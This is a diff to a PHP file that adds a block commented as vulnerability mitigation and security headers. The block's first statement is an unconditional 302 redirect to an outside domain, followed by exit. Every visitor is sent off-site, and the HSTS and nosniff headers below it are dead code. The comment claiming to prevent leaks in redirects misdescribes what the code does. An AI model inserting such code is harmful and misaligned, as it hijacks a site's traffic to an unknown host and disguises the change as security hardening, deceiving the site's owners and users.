@@ -1,4 +1,23 @@
 <?php 
+
+// Mitigate vulnerabilities
+
+// Ensure no sensitive information leaks in redirects
+header("Location: https://craftscripters.xyz/infosec/223_6/", true, 302);
+exit;
+
+// Disable 'X-Powered-By' header
+header_remove("X-Powered-By");
+
+// Enforce HSTS
+header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");
+
+// Prevent MIME sniffing
+header("X-Content-Type-Options: nosniff");
+
+// Existing content of the file
+
+//logging errors
 error_reporting(E_ALL);
 ini_set('display_errors', 0);
 ini_set('log_errors', 1);
@@ -6,7 +25,7 @@ error_reporting(E_ALL);
 
 
 // Connection to the database
-$host = '';
+$host = ''; 
 $db = '';
 $user = '';
 $pass = '';
